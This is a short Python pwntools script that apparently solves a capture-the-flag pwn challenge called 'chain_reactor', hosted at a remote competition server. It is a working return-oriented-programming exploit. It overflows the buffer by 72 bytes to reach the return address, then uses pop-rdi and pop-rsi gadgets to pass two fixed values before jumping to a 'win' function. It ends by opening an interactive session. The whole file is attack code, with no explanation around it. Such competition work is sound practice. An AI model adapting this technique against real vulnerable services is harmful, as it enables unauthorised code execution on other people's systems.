#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chain_reactor', checksec=False)
context.arch = 'amd64'

OFFSET_TO_RIP = 72
ret_gadget = 0x000000000040101a
pop_rdi_ret = 0x000000000040121f
pop_rsi_ret = 0x0000000000401221

a = 0xc0ffee
b = 0xbadc0de

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13571)

payload = flat(
b'A' * OFFSET_TO_RIP,
p64(ret_gadget),
p64(pop_rdi_ret), p64(a),
p64(pop_rsi_ret), p64(b),
p64(elf.sym.win),
)
p.recvuntil(b'codes: ')
p.send(payload)
p.interactive()
